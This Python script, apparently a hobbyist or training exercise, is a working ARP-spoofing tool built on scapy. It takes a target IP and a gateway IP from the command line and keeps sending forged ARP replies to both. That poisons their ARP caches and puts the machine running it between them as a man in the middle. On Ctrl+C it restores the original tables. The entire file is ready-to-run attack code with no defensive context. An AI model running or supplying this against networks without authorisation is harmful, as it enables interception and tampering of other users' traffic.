#built with python3
import scapy.all as scapy
import time
import optparse
#op with value means arp request and op with value 2 means arp response
#pdst = ip and hwdst = mac and psrc = gateway ip(ip of the router)

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target_ip", dest="target_ip", help="Target Ip")
    parser.add_option("-g", "--gateway_ip", dest="gateway_ip", help="Gateway Ip / Router Ip")
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please specify the target ip, use --help for more information.")
    elif not options.gateway_ip:
        parser.error("[-] Please specify the gateway ip, use --help for more information.")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)  
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") 
    arp_request_broadcast = broadcast/arp_request 
    answered_list = scapy.srp(arp_request_broadcast, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

options = get_arguments()
try:
    send_packets_count = 0
    while True:
        spoof(options.target_ip, options.gateway_ip)
        spoof(options.gateway_ip, options.target_ip)
        send_packets_count += 2
        print("\r[+] packets sent: " + str(send_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL+C..........Resetting ARP Tables......Please wait...")
    restore(options.target_ip, options.gateway_ip)
    restore(options.gateway_ip, options.target_ip)


